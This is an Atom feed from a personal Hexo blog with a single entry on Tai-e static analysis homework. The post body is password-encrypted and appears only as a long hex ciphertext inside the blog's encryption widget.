<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wd-z711&#39;s B10g</title>
  
  <subtitle>wd-z711&#39;s B10g</subtitle>
  <link href="https://wd-2711.tech/atom.xml" rel="self"/>
  
  <link href="https://wd-2711.tech/"/>
  <updated>2023-11-27T12:10:15.813Z</updated>
  <id>https://wd-2711.tech/</id>
  
  <author>
    <name>wd-z711</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>tai_e-static-analysis-with-homework</title>
    <link href="https://wd-2711.tech/2023/11/15/tai-e-static-analysis-with-homework/"/>
    <id>https://wd-2711.tech/2023/11/15/tai-e-static-analysis-with-homework/</id>
    <published>2023-11-15T12:40:20.000Z</published>
    <updated>2023-11-27T12:10:15.813Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fe6682b20b4176d5b83731e51160e182082247627c20a614043cd0f9706a0dad">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d59820bad2ef0f1b0e5e1d3f61d4cf4b0172bd432aedfcd60a848d854456803c573793d36649094a63def0fe5babd8ed5b1ee905c52c5259b7b42e55599a67b21d9b5d83e44e714d856453cd9f3de53b6714f2225f70d6b85ee2f080b88db1c0cf493442a748c45cf0ba34cf1cf2b948c59e8edd5ed17b4b9960448aad2d611b453ffcf0af6834f2a4f3700009b5f40cf399d901d127be1b17b23b1269f051f2e456817c0c79fccaee617174bfb28de86d9578b7426a6ae9497cb154d88421c861b0ec49e2845f15c3377d95ec80d505dfe4b0bfa7bfdad926fb832d07bf3f6cad98cc2cb55ba3047cfcd2a08fb3da29878b7635d2782dda7bc71b6765f17844c83f98c9aac378bf77ec506844ca0a455688920eb8655fff7dc4267ded0873eddfabc99549bdd5d7132d4877eaf4ce9ea3045bcdbb9ade4b147e19969dcba591421ac3c98940b0d84efd385f6e51262b76f492ee9f00116381dc982f0871eb1e44f8eb431c22398e383b67ca46efe641cd65333fda58f0a554c3364743b3d8e7d5b6ec2f1f0b4b4bdfaf947b69bedccf329cf9a69c4c3a24db8a608b8f35c58a2c08d026dfc7c638ee6153d85e7b9895376f76688126766ae780ceff9b68108f959c98667229df3b4bfca5287f32d8c9de78ea8c93d9f134e1c6ce918c41fdcbbcd5679886f4019783ae0083ead255b4a0529ee06bc2c05f26d27397ff7f8fbc96c236ad3fe3d0f76cd614886ecffed6bc61a555f191173cad5b32056c6ad38fcd989338850778ed471d9c770de935f9e31cdae9d83abc5ecab4888c4c6a9dee32d431444866424613fccb76df0beaac0e38d8ad38b42fa242fcfc73f0a71aa9ee8c4a864e2fc4fe3449209f708f2005715b740346a5712133a9134356cdf947f80cbe303150a498f5ccd2558796e3b46fe2d01ae82064af8430ec75be438a60728cdacde292920681dec48c5aa2570a96a4a48b253083810ed65fbcbfc5ff05ce63d6c4ec66fe7177ff3e000eac898a84cfa667707d4e6ad5cea0b18dab3a0097e3474232a0e3b5f7a31a98fdb0611dceeaf4238fafbf253aa2ab325b309f9b092b082160b2b3684e9aebd2443d6c569cae303a1c4555511b56d899c6a059f4c4915c079e99c9a3f945f745ff9bdead84fcadab44ab49a41732df95fd640b6f674f0cec9370978547ec8a63d3d3d4f2607b2b559231372a3028b6aece36a19c78aadea018003c2abd310d9119404df58ddbeb06415efaaeb99000cc978e5cb63c066efdb3d070d9d6fee4680f6014d031762ff6a0826b441da9eba7072fcc52b98ca283b7c056cc0f0b08b57148c2ae19a6198986a7b06176fc0132ba538c5ee5e5f5834fbf44c18f31e060b0f32633590520038d145fabd5e14d1e9d1ef0a454af384b160e932dfcd57ccbe51d283b735a1b4da5fee9ced45564ab095536a1cff37710d12fa5058fd3c1c87f12b6d41f11e19d93d3dab948b4288723bf672738c950f67e55e5f8cfa75307d738f1a928384de63b82e3a0ac188bdf235e833ac91520d8cb77f241e81ce3a93adc02855cff9c0b22d0a6fb36664905e94058c1f5e1c9b29bdc3a2290bad936a8d390a342599107b760c2cca334e843d00c8a138f82ea1e45af7c7ef7ea336efbbbd92dda238aa849f21bf5358ef683889e83bfee18cbbbf7bf556fbff8adc0c6118f863a00cf01d59030deacf5caaaa72a16eb0b6d39807266d7076f842a46ce7deab7a16e7683a4d363f5c3e7adc18a1b8073eeacddff9108cd2f94d8d4696fafefaaa6de0ff1aa77b127045d17315c4f3dc7c89e36c8117420a3e3f6672bc23f2dba1862771a66a63a64a7f593d4e094d2f901cea3a20d1bc70adfa4d8ca00d06a66089677468077c75a63bf20c21a6c5832282bba475cda380b394b5a95b1a0b85de04a149be7fa2a2189b6f9989500dd00a723051e911010825945b843dd214a699d9295cc7d37fd6576ead671b1566ff36545a03ba3c3881385a8e0c2835fb7d24af50e60be688191c02dc5b50b70b387aafa0d0bdb2ef555042fbefdf74d6efb68d2a42b60fe43640e880fc8a695f54f6de96e771b0188fc5a03487fbc54e21d82140467b228012c41d74dde4297f0f7ad35a9d877ab9e9506a4d0c5c320c9ba3323f02f9ce2610f03d26418337230091c2a7207d713e90c7a30a9b15250ddc20d9907500437d86530470582776b35d44cd3bf6edcbaf8552c8587c44aeb48bbc98a9fa9fc02f0e268d826ad21a2bb646bc6ec498db67ca969128197f4e8387105b3610b488ccf85f3fa246dac0a80b6cca49becac33fd41fed41e98073132ee7be6e5f7e0079037e828024ffd6d5139a5048cd7d740c57360278e1ee236460470e18f6f1255bbe2eca0cc32f2db77ac9e8f072e4c8f629c3fe49bf528c75ecc816e78456f095f86f09886e9c5922018c3b5d91201ab3704ba7f07f32fa9fbe85fcf72eec263fcaee8a4c8127f7c4328c1055e0e2d32f226af7a9e1ccb9d6b2e6ba1d40268decc03d01222c88de84fe846f8547d49afbe7c133a419c9fd1317ef880988a476c787e5eb11c8233ece6d0bf5fec983ef2d09ab84976b990a02f59ddb9950beb3e47f90080a4dcde762d1b469f3954e5ee5db7d8bccb133d3a344acebccc300f81ee662ee984d764717efa1efb900b9393509e05edcbc0c7ee5be0ae7a1d300c9d459f7ec00de1b0f0b248d8efec12c6216302d7ca0d7df3203f0242db57e0f320f2d6a3b59fb1ccbb0ca768846f3f97cefecc3c74dd8de4d9b6b002e6ecb27575fbc7c03a44dc2abde3341ea2b4714cdb14d6f08f72a71019b618ea5f04764a80ae0d182e7bf8dc66cff95cad7f2b2287a0e1e16c48a2bb250f9bc2eb55f5534216d36fb8079afc9cdbc4b51b277a616fb27c82c9762678d9760bacbfe48ec6a175243aaf68b4f22a4bcaefd1e6df99f46431b00c387b9887594cfdc311227114d3e6a964f1e9e9ef8ada7b376e8dd30211640e70c37825f82c81058b57e198e002d85a311a1210bb69586008e4adfeca84b3a33acc4b82235ab04235b1ae7f3b3d6afe5fbf318e4abf5218777acf47a3c7a35f2ba3d97869869cb2b6bbfdade9cc3d7e544ace44cd0d19a5307fdf73d64fed9a8e75dd44ac674a54e3c6ab8c2a7f35e058b2fc37213189d00e6ac6193880f9791de3e6cf2f21d8b76769d14545a7737acaf03d0dcd0ab0509c020ca3225cd2d50d9cc77c6f7549f791b96027129867b1992370b1e5b8459c95eff54314f59492eedd6712528b3661b14ee5a0d608bf11bd0a5497adfc6396585fe570e23771e1e35fe4741baadff08c82877c86f5be1160ac9d777a788ab42230db3daaa785ec1f47b48fc04507684998ca07ef89ab161c76f6b3ba230a487683f6860a050fdb853e6abbdeb87bc116e9c664c22265b8348716199804270825563b275c990a1b75328bed9dfd1a1b4613f7f659fbac76b7b3e064108a4ac52431340102b196aaab9ef602017ced281b8fb3558ead74c95c9c8d0e33f87ae8bbf36619575a20e4f960acb915ebbe71a71dba36bde1fd5c01792182edb6f82abdcd2d3503c438d9163ffbe9b474d29fa4b23c5b22075692f513e704270221c19c4b04c1e24908d9387f467c491fabd343e1eefbbfcb7209519fc242bd42909f14e19aa36c47f6498abfee20fb13a7e8e1a6b520094d9aa38c5cc55fa5c7f73a3716bbaa9df8d4c125a6c582ebee40098844676b92e6a79d18c206586a966d9971834bebcbbacec025a0989bc22cf3b74c9a8f604a265db6b3affbc19a18f95f349979979e88d83726755a2460762c1f306839d9d86a5ef997906ca44ceb55e267e76250e6f33d7e68ab3279702beee9cdbd7a87bd64a2838917826607a96d6b38468537ca5db6387cadaa12b0629ec447e8054d41b665fa7e278417327d409c47089b43552e51dc1493a433686961560473e65f91509d40b59aaaa69183c065f5296deb4e1c8d030d3a394b638e5054839c158d914d953dd0af5107f68569745ae85bd84ac12a3b539ea0413781fdecda4aed6b9311b658471372983449bd235d5f9e8a682d7f734294eda677d0d150105625f3df35bcebb2d902dcdb915c522cd50b6c7563970d475faa037770808511b16fda3bcbdb14117491e9ef8494cc8a213f4e0837d38e5eee757700d37bcfc9ba60890895ad78180e5fed6c131aaacb21a1401df18a0f0112a30a0ed7cb3c97e665ff6f43705557005d2a276fab6c0f906b34b981e4f7b6240f7698354bd622e204454518d9f5feddd40d515d76f405452c8eda1856b108d39bdfa9cd8e4ecc8f5b02c1415efef16a7d7cb33912f54dd4e13606f14a498c768101e57a6b853d598d6a286c90e164f178f4107a05338a622e1faa0f0c64a629de73976aa66349e9c8ff6380971d89281f9317a8c35de41d24633adcd433d8f0f952bf1c4b7403d97012acd841c7d1b5cb4d6fc45dd6b45515357372a8a3b9882a6583bd77ac75a75f391df807c6458a38cc7fa770cc08937b646835a86f36e77300a536c644cf55a9a49b72b5dd822084240c3252537be7f9121369ef0bd5107fd59ba042d48e6620f7b8098b3f8893f996715d99e8233ffdc023ed9506adfbc134cf54e4e35746b866204f5b212db4ccc61a2e7ece4b4a78c9f98d3e73bc4bfb8132833d606c6cdd5a8649edaec96f097adb0ec70a9519ba8b20bd5b8a42bf0a666250d2cadbd8b28896961f7cd5c5a09fc8ad6b76484380357d143efe23d5c157cdd0e1522f81d195d2bc0707b017c7b2fc3a12faed627280994cd3f59fd660e5cc5e4c6ce5e9902049c5375ebda1787a584c7610de583a2d020db7f9dea90ab552c35973b8ecbb53cdb447a8e6606db2e1e1ebf6a1e85826dda00e1d4297dab457e3a5c440382e05e7f61a5f0dddeeb263ec54102c720be9e35c4c11fb76487f11bceffd07d9906cdee13c1f0f755abdcdd1d15c5d6bf07e8de73b4ea9d757a9ccf098d40277a824333a9c622fbbbcfbbe2eb9f9d115ca69480621f3dc6b7d3e429d926f9c14aa5d34db44408350b409bc9cab0824e9a761bfb79e83b9a4d766615143afe531131dc9ddddad25b2a4649748f5c7afb1f72c7b9d98c93b6b43d11af532ef6e1af36c6db6821bf7944e362b79cf76e8a5bba65afc98f1eee71a34a2543c35ce0132b79f66bc3e76850a908d2d550605a938237ad74103f77eb08a595d6a821434b8096192c112d5764f091affaa7640dcf97a28574a151c14c6ab8e81eaed40d9d5233885a0dd7a3ec76548c9b5e1668b343f13b790732f13213ce8a87993395b6b240a38d2d82ea40f88a7fce510853892f0f8b9e8648ec67e62bc01e42188d172036f0694f22642cc50ab5bd180490b9d9eb38be7f1169299e815ad83e2322fc6fd337f3a28a6318cf62d4cbc8510c72758051ca33761cb1dbca455ded523e1cd57c2de609a1bcf3c5481a1c226b09788911d9be1bac8137870efeb84b04353e6f49febbdd82d5210f6290267e25ac9530ed5cfb95aa7ad98d1b23cd37ffdd6bf4c8af48456a9c4bec919c66ec3de39a20a315b6c714059d01e14fcf470ce4143a7218899cb16a19d24947a43ffdbd65a2c16efa0253f6df6e76feace9ab07aa02aa4b3e5f32bd661db63c628e5d26bd3190da37859281990416c871ac390fc27ce4ca97725503e74bfa0b2f649f6b65e9be8f10b9944f452599723ede73e82840c058e6ded06ac4ebc301e3121b7a3c66ba63321156181ce19446724e345a008070f66005b48d60f8662b340b66d5297861963f98ba3d6a515bd508928cc6a1c433fbb84e2a06bf89d0a3b2a1ecdc472a16e5d3d7673b73d67ee0b681c39f9771ba1d4e3394fa69e38dd6b6da69a0287feae5bf3e67973332fea34668a18ac550ab0f11960a4e608c0394128e3a2abebf3ac39e8ae99ac03670088e028c0397aa1e9c9abb745dedd6d6abd1053909d8132462700401d4c351d94297d10a2dc69ce549717a2b94444735184e48e7a19d26185835f3261584f81d471940693bbd5ef858619d4959a231d362387586035ef701916a6d1b1199d7667ee1d912099ac3e743467233fb1ef5d651267882f3e2f7c41fe1bb451fe1c85f1dee6f4626e2d18acd795e61da5af639998b4f005c4adafa7f9118a89ad6a160eea0f9722369294b4bb6c8c52bd253dca75728cd31987c939f1a9f42268c293e25a3956d2b5adf664707bd0de86a5cf03478f532edd7eab125cb9332cafa81c86ce25264301522dc2401414e788c98ce4378f6f1b8bdff8639857998b7ddb362311fa176d2dd985b1187da41c46964d70209b01eb5c7c86636137fa4718c1a381c3da71db7c513b1c8e9a7193c7259e56cb93fa7853587004dd8d89d6da2178aa751b0b93df5cc2c6a10dc45e55f8ad7968590b7c5b8a9525eae8c1da5778ffeed19d3173fa1ae0c0220e87919e68973e71a61c52eb85d62d58074c6ab6520aaf4c3f164773867a46ad8c799b8cfe64225ef4680ae4a5dc227693335ba6ec66bed9410cf0eba92dedd62b427a641a6c999588f50abbf10f37373412004db430cc5f5b64271c4e5d8260dffdcd5c3fce674a1d12457c1571d4c5a243a7d6eb62ed5910dc8ac59ca009ceee4e61b781f1e5e4acc6c0e90e1870344a88885c8aa98de18f15bc9e180620611c7b3454c06d6fedf50eef2aa0b2ba885d1179f111f192353d411d409c4d3c70a20712e1b75bda5c3673cb7831957541d6e492d90184e6591c9c56395aff44a61e466b30d98981e6ab9f3437f1c02fcf83ece5d18fc88c49575138c5066a2518d0382f117b4a772fdd7f505ab0dc2af089d19f6f37f5d979a0529b9559fd9eb6adedbee671706a4835a2f0f7cfbb340cdfdb27898d5be4d865b0af4c8621a67bba2706bf43b5af2f6c925b66eb4c41e9f719d5cd02e10568d7dfac2a36bc54a42e56bddd5652f9c095c642329ed93420b938e6776d0f219d7bd9cffa831830b3ab79fca37771aa3c9629f14fb26cc402fd3bb41a607f4ae91c54da7a5fce7aa804a1da233d3800e1a36dbf8d9f1f3425a5009792bf5c0a11855ef7f34796d80f46d9bff9d1903ce66abcbf7237f8ddf9204a53154a8c18f966db6c3586a1b4fc26d2f60f9385b5586bb3bc5900c3d90a520ee1a4e7e2f0cf292f8e5dedc88079b870c9122944ae3b0d242fc48f0a481df31a7084a2f12c1c957a7148ab903d1ca2bf2f0ade62297a7e8881b4778bd1e98c5ab900d526179ed861fb23163dd952f3ef5d62a6f65443bcd07666e757c218b4b8f93e5f29f378170f195a68406f64657b207842ea61b342acdf5046038c3b29a02ea8330fd9a3641f90193a3d63b2d5231b55a80e3f260e0f1180a461ef73c2fe3ce34c4c899fd168b586e40f2481bb43321944faf61b4413c81057736e6870e211279a09cea7df64460d934eed50ae58224c1a88cd02febfaf407608ff3d65f02c50df399958dc897b65352b2ceb79cb1c1b86aabebcefdd121aa0c8e611f8222858e9625b3536d2c868340a3c08dca67eeac4593b563cb5976459bc0cadbc54319e642b8c5f94875deba8b5c9616d79b547473af238358ca2a4a5eb4a0f9e18b63e4bb1e5ac90a3955b819ed774ded871390dd88bde8fae294d455eff3cb0df4e80007ebd50cb7917780de63c32d9c260392666f3491e2e1a5219b08b5c5f8e27d02a1e07b256f6f1b2c2b466d94e2c046bdec83e7675371aaa2e9bbe8274ef05b598db880a5266d07e5139e52fc71ad15ea786bde84feea858d722366b3dc9f39b6f1d37ee456b2e7cefccd5036717c05a5130c010ad5dee168f149a36b414b53cb29d87bd070a64d0adaede99f8e5d55181109afb765fdba712b3e15383782c6f25b2cb1591fe60ed12af4b37f8f94ab9a6ba3b454145e9a97e4fcf6390206de1c7bd9764d78bc4f4a1476e01f9d8da1502a906f2bb62d3524c7d1bf02c7076c5333b71d1030f2fde27e361c35b05f38ba086b10c4ed1eca7a9b2d1dbcc564fd8487da1358d4b51ac1aad98f42f2388322d1a84568e0468b3b4299f52099336d028124f13c70167721dda788632aaecc9e77614ac8cc6dc76f26491f1e6877bfdb9002610cd2aa2e1a28f38bb8a1dd57a8aec83d20099d694b77fe84eb064eae02cc9195af82d2ad94d3858f4610b598bb4c91a7df381e1b68c637b756676fd99ff764d97c638dd78d42ebb140cd9aa2a4c4c492679a86ac31c404206743debc0a6833da6a6dc181218bbdbfc9213ced4ff6ab896d6a5fbc2547bc645f31b376712deb808506cdbb2916965522fafaa02ff326b27307743576071313d6a776729958d15393aceea68ba6f87559dc1cabe7d2de2f43045a1f420afdec0fc09baf5d6e6d7883fb52892d0e49937f2fe0cd4674dd36756fe61028abb369582d2451b2b8e2b6032c53fd4edf91be93ed8d47ffc508deb9e81688608355341b3f1e98bd55807667da39c5c610d10a795aec46472ca56fd4cc819dcfc798f0a584cc71335055ab222be8b67cb63bcef7c00cb5551fa3ba97b9801728644c0baffa85131c86d9a1105d4a3393c50c0ff1b66d9c9bc95bc66362ff6cc312dbd23dc226275c5a5eef9370bbb962d5eb96554a58d66e67c78de0f32430dfd798cec2604b035d83d07c3bd62589cdd4b65c57824849f8d6d4c2346e54d872362e89873b39239df0fea9e8687ccad71c6901eeb24a404851f1870c439d2a2ad1977c786cb9acc089b58a77a25778861899ad8143f8399e96d7dd11bffe133165b2c2943be12b5608a0efafe924df2cb96a4d852a3ef6602da00e9ebca89519fdfcda93d500495fb1f7cbab5c82a37038f7159ab25b0d1deb24ab0d043f83829740a11b0d8917d53f0204254fdda638713951e43bd6047c45c67c136dd7c5e7c7a0baf0e546cde627ef826d1c786e9cac2e0183574222a22b7a344f4a891a62829176504c632e86001dd680ecc484ae95aac167da65c2a3f7539131215a4fdf33fab4903fc7cbac8a60593173a002ef4e83e9ee96bfee4df713793cd389b1ef4453d5689230bb03ab94e648bd7418bf3b0a7e192d244e707643e2efcc030c6a94132e2f0757c0555195c8c9bb6d32fccc064148121210cc321845cc1c726b9f1c1f8b6134802ddb553415c3ef893357a69c2efa8f33a3747b37bf9e0a15d2fca07fe3ab8e6ec66e1d1b24ce9e032aa8dfbf38c3bf81bf366144c0ce429fe7467d9c789bea51762fddd1c553fbd01663fc4f51655fac7edbf8506292fba72ee1b60d6887c48b809532072d11ad53845d34d05ea997496f0aa602801b187bbd00e3278a70aad380f78f1096b9cf7cda803a3bbb5f751054fda0a3a531f9a5f9d9cf047f8d3c98e9d3f3c1179b41ca137d745cd50336d29fc69741ccc3dd21d4c7f4c0459680154506ea408eb17ddaba61bd6e622f7cc6fc948db3b5d49f015221bcf5b3763c6854cef31ccacaf35724a3bbcfb16dc9a5093b7ee1f9810f7798e052a2701449a68bd50cd6ac838dd8335178f2e1feb33bb6fb9fff9cf02a58e93d0d8d43ed8b4fba1112a826b3d101950b44c5811115eb958b1a12bd9c4caa843cd20d3d204d619b0b97883787de3762c333013278ef07c63f9e640410ab6d908307424d1be10e5169d014602d333007121a067f056278f5b3ba90204e2c1c30c1ee215940e2591cd78b610d1cb81b2631514065474946873b3e32e85559ab4f48da5afe8c1adbb4b3d5e9438a085aaab272f19804a2509e7a8f179db2fcc1d3eb913ef07664767d588ad3ac9da2d094d5dcc161dbc3d9f8653603a4cea6f99ccf9b08ae0e9c24bbb1b9ae1b4857d5064aa1f25e0019834def2242797124906ad0c70cfcf8a9dce1a4e80339daf1482f6349ee04fe7e98e9c62ef74f5cc53bffbd38c018a57fffe9fcfd59b921d060fcc0a72da13a4635d93c96510e9b6e2c0c03267d23e5e6ca2778aa696949fe98a1433cc3488763b521b460e2223d590bf32d066dd2cec7d3caa6b3b3f19a89a59cf9f75d2206f38b5157669781d7c325d1174740eed6875eade7c7cc8ff0df929356d0869792a65a5e224d84a04ee1b1670b0d0ed7654c8a251cad7ffdc869717633655038097c1be3bc73cf4b155d6fa687abcbfecb077a67e19fbd4effc9a86e1eb392ae9edc64c0cd227ab14b1f93530e263f738896bc86b8d7f7c30c6aabd3ca2bb1a4575f4c3973047567a41dd76372d62f643df95e6a448f6d73d16b8c023172dc0f5e2ed6717f5d52ea8380b07847fc55774b7372b45cdd836018f0bae922389a590b8e73ec129a5013ca0b0268db9c79c81bca23d24f910a91308ba833e6116752169af4229a721e45c563e2738f8f1fa2b2f5af5121769c3378986be71629a369c8169954ddc852aff35d49791e1b9ff29759bf3f36c265e450256f6e1f0a6356de80ab14a6078e0203004026ba49d12979f3cce4cd762ad62fe63b5339ed852206dc3ee40852f027962021d7dd21f1fa0e65193c04f02c2d3be0caec21e8e165f80044332f075cd13abccc157a0bfcd63110f70fa1e049f73cd68ee396691397187bae905cf4463ab107af017b70a613dd2967ca0cf3cd21988e5c7c9b8df300cb12f82f4a6b83262ea9ad80c607c1cb5c14c09c9ce6ba99653a5f9a6b2db3556fd94a00291368c96b62ebbe361eaec68c8ca183046f598d1f8cfac2d6f3df24d3f1ecac2f1ac0066024470236aeca9b88df5d6a3d74b6665a451d86f3f544d8798d7dfa0e0fc90bca383bb9afa62edd89b51c1495304d79002758185b57c174e0ee80b4fc03e31cdd3c3074c5afc04721a76d223d15264c199720990a068941b69b2fafc3d76ff7f2764d5268338ad039bb8e20790b60f3c3eb549d152969760e4151554df14cbec87076ed043c3cbb7eead4c32cd39e5e43825eb9b398f39c4e96f8635dc8d150b3f02173f3892ff0e4e7706d10ec35f745b54f0c7514c21b1f0162d05343c5c35b8e891dd3a797910b1590f10821275cc9b2f7210c4be5a7371c3280b8d318be303439934981806594e1575a5da4eedfd92b70c12d3491e77f9d4be04183566e65a49ec74edf361e19a9c42e4f6ac027269a3d7c463b7aa88b164bb80ce28b9b74845a872491735ad4110462001aafcf3f90431962f3fd01f31be6e4fa794e672f08cb26e70198539ac2997e6a58f6d180801fccacbbf8eb4fe776b8637593197ecf64e9b6c02b009eb325c82dfcb0ce62dd488447acd9a6e70be067f5b23c5e923e56fba96ef44659be9946c29a3fe56aa84a0dd7c28ecb8ee6c029f247f584bc5e59099e5819dc15ec71c06828da456e031c90b571d98295375b33c1d087e14954b5304e8ba23827fe82dd1e64ec08791cbf5d7d1d7ba9e7ef02186b8563b075a3218e5b724aeb2f776031a01a801b23cfacf26805cc0febf601ef3d28c91c04c69eb8f09dd06a463ce82f569a3bf0f535fb5bdcc5e6f5752154742543fb4d285968d8edc26d87f00785d05edebc81593a73615c041431cc0416649c5a3bb954b44bf85eba734dbbc346d595bf7e8daa1878553497c0a1ae5e22f3cb6e4444a25faa71fb083a292d22fb0eb6299c8b33f4fb37dfe9fffec4997447b353537ffad4d07813490d7c092f30fd0fd040cec1c7259005cbdb1fe38b315811d1b712df603b661a76851c233cccc6e84c34c7ed6c0f4025a1210f5a15c1b5ad1d91235bbb979893b7e52f5faca8d69a18e95a71ff7063c66159f514e0f899b05b0cd5cdbb062844a51c3e545f0af8bba72eb30eb9865e1eba250da0eefb3f5cb45cf15125e695b8d44a44d2bb44d7fb1e381893f5f24541ddd8490c5f3306f55726c3a4eb1b43a94a7684d491ada60f52cf0da3fce9c8ec4ed1e8867ac647a37956435e180fce0edc79623e6decf05792518d0bede1eb3215857bf264a1519bfb176d88bd917baeca20ffdec1fd8b5d012edb385e0841daf87164dcb1b7d43d10deac5df3609a5ae4260bd4c2306d65a953c8458d3cbb572a80e9286bc18bcb02d94f18f608e49c146d790ffecc80c7af36f9361e37c19db3f3aaf15e4a7d63812b9e7432f4be4a7c5b9f4553cff3a09870074bc06d9769b3201085a3ed69ca1f7f4dcce4911e480b6dfb288287989e426c2940bbc77de5dd5014b5b6102d42a51d4d9c863f816a07d5e6261e9a560f99bc9b7f9116a0b1422a333e6e91f74f1a900ce9d8091879d7a30a261d5140783774b129af42ec0626072c04ebed9b34051e5bafbf895c2b234169e178fb06bd70a46ee49bd43a4925567e90ece359335af6fef84c5c9b163fdf170b341f175ac4be28993aa08abc53dff796a8f241fa296797de00d0dd3af9c8ebc6ca0c34d94bc592596ea3a8246ff78a3609b4189069aab22471369b32e222255b8cf349f816dbceb7dff38c06a4d87ec4600927906e7766b87fd51041a63e26f070ee097b7beb1e3e16d718215aff92a76a87e2798a3aa6612ba17375203084412bc03a7de0ad0886545d98e7baec331bbbd8df2f1e1175207b723bae1d0bb4bf32e2fe666672972e3c5374694c7ec1be95216b61881882f48ed287f503fa4fed3f6e6fb24e276fcc59838452aeebf261a9e6c1a7e8f20add024886b74c6c374ce2eae9148d5979a03a0eda40e70f4616c5f5860dc06b40be177848413315daa677c1d26c23cc242641acedeb5d93a9695f4bbe8bf19ebe21a90bd934f90e5741af406ec6ec2148517078625d29ed542fdf261e35037ff548a8d85e1f8d93f221d3ce6730939066b294268cfd9884fc245ea8fa07163062937d79326fb12c5e363c8362f775a190544bf21d6590871720348265903c1a99aa396dd8d7c2b85bd3e8533bb51fa53a738941b7c958d29e3daf214538f9459cd9e864753fb88a7f1a8c8f9b291265fb4a26d46eeb3d7c02956daa3f3f09a574fa138252242d1e8e2dccedc747849d73c62f68c5e1420c7e3bfde5b2ad61c55630a274584966ab4c27f7de68f21ac6a43708bc5c3e5c1ca26942da068136131c590d7fd15372b29dfb4494ce974282b22d175da4066b688c3fc15ef03170663b0a91d31fd957575b9c346ac6c2b40f523c53391e62a25cd336ba2252ddf280f1013e5f1ba5d6d5161c117a1f944026292f1d409aa856412fac8775b3c675da33ff487af0e53f942756d679b9168bd55bac8b43c0f9eb9cb7c49eda6d7dedfe06de12b55f115ec745fc86b51442e9895532dc9b33d6b29f0a97f3958b115be59ca451f159e115fc2bab296395b9a6d3251bae226fcae976a75d3592866414e6a54ce4509796f30234a089d94a2578cd35237f408376b4b3333cd16f505320dbb22da0ef4c086d12dc6737eab13606ebd64a6d72039fe2393bafa4c7d7c3187b49be02591a9bc310f378bc319d250633c75ccd868316f85eade9c333a431ec8d76675c01c6199fc01d30b8e0190df7313c9e58c4f60847b634a030331dd64295998e87ed223ede85126180ce526ff71e1eb9134ae39adc22a7d4622cd94d9b4fb1f3239ece52a2fdcb3c221ab2ed7835f0968c29042942f648520fb42cacd93d584cc730284a91040a129d6ed7e113fca8ec019cabe0c6a7150d766886ea8e6e87945059414a3c8f7d19d68ee95e95516337cdaeafb65acffbc449075c4669528c595406e1ce41c0cc5cdbe42518d87e0e77182be7b667e1cfe4138c372415d6e918e26444edf526e713e20e9372b8001391eb27fd91b55ee91086af4d1e36b9ed1d7bc4fb490fb71d355318178059456688fdcbf9611ce78a48487de79559ea2a93c89e4f123ece0de2a1e70ec95bc7828078349c60d179ecc41b7e979ba17a5731311f6b4f538bc4916ff9fcbd7fb6f93f19dd5d9087240ba8b48be86fe2972f001c59e0165b39b8442e799b447f006fdff06264c713500e7af0bff40d49f566c7ff80d9ca3e58a8642fed5ffde0a37b81facfe0a01692582b10b4481e4c89c330f5d1bdee9806dd21c4e6407557a72a3c062bd72c7d151a4fc3fcc722f6d7425bc814ef28b25285b49f524186bfcc7a65437601fd6a5e39c76b3200630fc160ecf2e4b4cce3afdb5a83fd47219aac0fb6724ae68b67a8ab3d1d761b641eeb57fd2d92265a86cdf2988419cbd1af777c7b60fade1ffb0cb619610cfd9f251d896ea1dc95daa867fee2b47b9e6558469d8b1a090aebf58b442b2f377ed4f4af880d1ad30893e0cbfd00adca726aacadce10c52d46459d68542533956906ace72afd9bc688883c62f2004b1941ac8439d90eb8009ac53ee4d91e381f0d7b9bb4f93737db7531c0f2c6098473db2e2c5899093d5dfbf7e7ec623851d8e19a1a81235de6f0600dea737b5b63877345bed247d6fda74ea5bda7b36837002247a62b10df9e256d7a2df833e74e8fff69b13330578fab23a345c92c576ef427861dd82b3982342a72cbb908c1a42a203262ccb3f7574de48bd4d55a12c9e51fcb6ed104efd3a86082e983abb829edb73e3f96db04c8f245c196b7de86e645db02c33600856f330811ae2c6f57c11038ccfc70336d943294aae1b832682339e00f270cbceb7c5d384df0eacc657f708ca1e6ce3302011a9455b08226f7d983a3ca4c6b7127860f759a64a8847e3cfd76ba05452fbc3cb40ef4b0c2773777515427d8268dc3c66f53c779075b130e273335cf0907eed14dd6dd8625fffc56d94eea867186b6da3347aacf1a784ee4ab012cfdfdc0e520db51c7b59d4e5c2d193b8752d05b8932f74cf982d7b58b830db974fde48f5fd419d953c724c9859aa2f4bc987e6c01620c933e7b093fd69deb5ca2c5adcadb40724a82d6430fa3a38d5b66bb7099f241c994d0e2e0832378ab1038bf26335d55514a7592170cae5951c47ee954cffc3e21c948740cab94ff6d6d3ee23cee2efbdbd2b69de54c1bfa9307ab7293e427ad1321e8e998ad88474516b5553e77c26d0314b4a7688f7ab04bb5602960299d6f2534d4a3fd59c2507e680942c889c094595301a575c9ff4698a856ecb677cce7f339a592b91781126731381df4cc7671d9bf2192c39a1d14702607099695615fdb512da8edd08ee1340427fa0991ad40ab3887da1c30f3e447e9f707cb4f08e282ff0525706f4b1816d3160830f2dd76f1e209d712989f63fb1a22b28a701f90c6d568545e9ca3d7dd679173adeaff0840182ac267a2620edc3535b67815c965464d1d13443991c7fdf6843102ef5bfb649c55729f17363417a6b51a27e2932e7bc9f186f2dc18fa3635349b763717417c8c8af9ebf22c74019dcef8e893cb17b6a85b5ea72b66c8481731384c8acc8fdecbeb22e535fa8cd959c84a7581a12eb48f959d1d00b8daaaa0475678c9283d23591cb306f5d8429f39df10e0be3431d28e25d3377b09b545ef4e19268fe21e508b4e8b1d114a1c6a9e99ce24d40c7fbd74c60b1158acfcf52ef336b8fb17c7f0e86565d2d5900fa53d71d8c69529b79a20fd07df8c46febd70c41d04fd5b15c8de3a3fee78b19162e822d99f61ec18dd1a5e1fc1bba7054b6ad1dbef91ff10abb0b978fcf3e621b46ef6e8a87dab1c7c1d1337faaea92d773aaa8789a94dd7b756f4c867795113383119f85cd13d70581f2bb949b74c8d80d563cf5eabfe706c1246eb70f5bab49f54592cbafe48b86ae24e5fdd51c8d7e17738ddf133d60